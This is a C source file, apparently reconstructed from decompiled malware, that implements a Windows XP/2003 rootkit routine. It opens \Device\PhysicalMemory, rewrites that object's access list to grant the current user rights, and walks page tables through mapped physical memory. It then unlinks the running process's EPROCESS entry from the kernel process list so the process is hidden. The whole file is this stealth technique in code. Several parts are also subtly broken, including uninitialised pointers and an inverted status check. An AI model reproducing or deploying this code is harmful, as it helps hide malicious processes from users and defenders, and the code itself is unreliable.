//
// Created by BLUE_gigi on 01/06/2023.
//
#include <windows.h>
#include <winternl.h>
#include <aclapi.h>
char rtlname[]="RtlInitUnicodeString";
char zwopensectionname[]="ZwOpenSection";
void* ntdll_addr;
char aCurrentUser[]="CURRENT_USER";
OSVERSIONINFOA VersionInformation;
wchar_t physicalmemorystring[]=u"\\Device\\PhysicalMemory";

void* rtl_init_unicode_addr;
void* zw_open_section_addr;
HANDLE physical_device_section;
HANDLE physical_device_file_view;
char ntdllname[]="ntdll.dll";

HLOCAL __cdecl edit_security_descriptor(HANDLE handle)
{
    HLOCAL result; // eax
    HLOCAL hMem; // [esp+Ch] [ebp-2Ch] BYREF
    PSECURITY_DESCRIPTOR ppSecurityDescriptor; // [esp+10h] [ebp-28h] BYREF
    PACL ppDacl; // [esp+14h] [ebp-24h] BYREF
    struct _EXPLICIT_ACCESS_A pListOfExplicitEntries; // [esp+18h] [ebp-20h] BYREF

    ppDacl = 0;
    ppSecurityDescriptor = 0;
    hMem = 0;
    if ( GetSecurityInfo(handle, SE_KERNEL_OBJECT, 4u, 0, 0, &ppDacl, 0, &ppSecurityDescriptor) && ppSecurityDescriptor )
        LocalFree(ppSecurityDescriptor);
    memset(&pListOfExplicitEntries, 0, sizeof(pListOfExplicitEntries));
    pListOfExplicitEntries.grfAccessPermissions = 2;
    pListOfExplicitEntries.grfAccessMode = GRANT_ACCESS;
    pListOfExplicitEntries.grfInheritance = 0;
    pListOfExplicitEntries.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    pListOfExplicitEntries.Trustee.TrusteeType = TRUSTEE_IS_USER;
    pListOfExplicitEntries.Trustee.ptstrName = aCurrentUser;
    if ( SetEntriesInAclA(1u, &pListOfExplicitEntries, ppDacl, (PACL *)&hMem) )
    {
        if ( ppSecurityDescriptor )
            LocalFree(ppSecurityDescriptor);
        if ( hMem )
            LocalFree(hMem);
    }
    result = (HLOCAL)SetSecurityInfo(handle, SE_KERNEL_OBJECT, 4u, 0, 0, (PACL)hMem, 0);
    if ( result )
    {
        if ( ppSecurityDescriptor )
            LocalFree(ppSecurityDescriptor);
        result = hMem;
        if ( hMem )
            return LocalFree(hMem);
    }
    return result;
}

//This function dynamically imports the adresses of two nt functions used respectively to map
//the entire machine memory to a section, and to open said object
int get_mapping_routines(void)
{
    ntdll_addr = LoadLibraryA(ntdllname);
    if (ntdll_addr == (HMODULE)0x0) {
        return 0;
    }
    rtl_init_unicode_addr = GetProcAddress(ntdll_addr,rtlname);
    zw_open_section_addr = GetProcAddress(ntdll_addr,zwopensectionname);
    return 1;
}

typedef int(WINAPI *dynamicZwOpenSection)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES);
typedef int(WINAPI *dynamicRtlInitUnicodeString)(PUNICODE_STRING,__drv_aliasesMem PCWSTR);



//This function tries to use the handle to the \Device\Physicalmemory to interact with kernel memory
//https://files.zxce3.net/pdf/learning/when_malware_meets_rootkits.pdf page 9 from the paper
#define XP_OFFSET 196608
#define WIN2003_OFFSET 233472
HANDLE get_physical_device_section_offset(void)
{
    DWORD physical_memory_offset;
    int winStatus;
    UNICODE_STRING *DestinationString;
    int v4[6];

    VersionInformation.dwOSVersionInfoSize = 148;
    GetVersionExA(&VersionInformation);

    //decide memory offset based on version
    if ( VersionInformation.dwMajorVersion != 5 )
        return 0;
    if ( VersionInformation.dwMinorVersion )
    {
        physical_memory_offset = WIN2003_OFFSET;
    }
    else
    {
        physical_memory_offset = XP_OFFSET;
    }

    //initialize device name string
    dynamicRtlInitUnicodeString dynRtlInitUnicodeString=(dynamicRtlInitUnicodeString) rtl_init_unicode_addr;
    dynRtlInitUnicodeString(DestinationString, physicalmemorystring);

    //initialize object for ZwOpen call
    OBJECT_ATTRIBUTES attributes;
    attributes.Length=24;
    attributes.RootDirectory=0;
    attributes.ObjectName=DestinationString;
    memset(attributes.SecurityDescriptor, 0, 8);

    dynamicZwOpenSection dynZwOpenSection=(dynamicZwOpenSection) zw_open_section_addr;
    winStatus = dynZwOpenSection(&physical_device_section, 6, &attributes);

    //if not successful, try to change the acl of the device object
    if ( winStatus != -1073741790 )
    {
        dynZwOpenSection(&physical_device_section, 393216, &attributes);
        edit_security_descriptor(physical_device_section);
        CloseHandle(physical_device_section);
        winStatus = dynZwOpenSection(&physical_device_section, 6, &attributes);
    }
    if ( winStatus < 0 )
        return 0;
    int check;
    //finally, map it as a file to memory
    physical_device_file_view = MapViewOfFile(physical_device_section, 6u, 0, physical_memory_offset, 0x1000u);
    return check != 0 ? physical_device_file_view : 0;

}



//This section maps the content of a specific file view and a relative offset to a variable
// and applies a number of masks to extract the lower part
int __cdecl map_library_handle(HANDLE physical_device_view,int offset)
{
    LPVOID file_view_address;
    int file_view_offset;

    file_view_offset = *(int *)(physical_device_view + (offset >> 0x16) * 4);
    if ((file_view_offset & 1) == 0) {
        return 0;
    }
    if ((file_view_offset & 0x80) != 0) {
        return (file_view_offset ^ offset) & 0x3fffff ^ file_view_offset;
    }
    file_view_address =
            MapViewOfFile(physical_device_section,4,0,file_view_offset & 0xfffff000,0x1000);
    file_view_offset = *(int *)((int)file_view_address + (offset >> 0xc & 0x3ff) * 4);
    if ((file_view_offset & 1) == 0) {
        return 0;
    }
    UnmapViewOfFile(file_view_address);
    return (file_view_offset ^ offset) & 0xfff ^ file_view_offset;
}

//Get the content at the offset of a mapped file view starting from zero
int __cdecl parse_ethread(int offset)
{
    int dev_file_view_offset;
    LPVOID dev_file_view_address;
    int final_address;

    /* Starting from the section reference, start acquiring the address of interest
       from the mapped fileview, and use the same address to acquire the
       corresponding section object. */
    dev_file_view_offset = map_library_handle(physical_device_file_view,offset);
    dev_file_view_address =
            MapViewOfFile(physical_device_section,6,0,dev_file_view_offset & 0xfffff000,0x1000);
    if (dev_file_view_address == (LPVOID)0x0) {
        return 0;
    }
    /* Apply a mask to acquire the address of interest
        */
    final_address =((int)dev_file_view_address + (dev_file_view_offset >> 2 & 0x3ff) * 4);
    UnmapViewOfFile(dev_file_view_address);
    return final_address;
}

//Overwrite the address contained at process_pointer with the address of next_process_pointer
int __cdecl unlink_eprocess(int process_pointer,int next_process_pointer)
{
    int offset;
    LPVOID lpBaseAddress;

    offset = map_library_handle(physical_device_file_view,process_pointer);
    lpBaseAddress = MapViewOfFile(physical_device_section,2,0,offset & 0xfffff000,0x1000);
    if (lpBaseAddress == (LPVOID)0x0) {
        return 0;
    }
    *(int *)((int)lpBaseAddress + (offset >> 2 & 0x3ff) * 4) = next_process_pointer;
    UnmapViewOfFile(lpBaseAddress);
    return 1;
}

//free ntdll after using the dynamically imported functions
void free_library_wrapper(void)
{
    if (ntdll_addr != (HMODULE)0x0) {
        FreeLibrary(ntdll_addr);
    }
    ntdll_addr = (HMODULE)0x0;
    return;
}
#define ETHREAD_OFFSET_NT_5 0xffdff124
#define EPROCESS_OFFSET_FROM_ETHREAD 0x44
#define PREVIOUS_PROC_XP 0xa0
#define PREVIOUS_PROC_2003 0x88
#define NEXT_PROC_XP 0xa4
#define NEXT_PROC_2003 0x8C
//This function unlinks the EPROCESS from the system list
int hide_process(void)

{
    int file_view_offset;
    int previous_process_in_list;
    int next_process_in_list;

    file_view_offset = get_mapping_routines();
    if (file_view_offset == 0) {
        return 0;
    }
    previous_process_in_list = (int) get_physical_device_section_offset();
    if (previous_process_in_list != 0) {
        file_view_offset = parse_ethread(ETHREAD_OFFSET_NT_5);
        file_view_offset = parse_ethread(file_view_offset + EPROCESS_OFFSET_FROM_ETHREAD);
        previous_process_in_list = next_process_in_list;
        if (VersionInformation.dwMinorVersion == 0) {
            previous_process_in_list = parse_ethread(file_view_offset + PREVIOUS_PROC_XP);
            next_process_in_list = parse_ethread(file_view_offset + NEXT_PROC_XP);
        }
        if (VersionInformation.dwMinorVersion == 1) {
            previous_process_in_list = parse_ethread(file_view_offset + PREVIOUS_PROC_2003);
            next_process_in_list = parse_ethread(file_view_offset + NEXT_PROC_2003);
        }
        unlink_eprocess(previous_process_in_list + 4,next_process_in_list);
        unlink_eprocess(next_process_in_list,previous_process_in_list);
        CloseHandle(physical_device_section);
        free_library_wrapper();
        return 1;
    }
    return 0;
}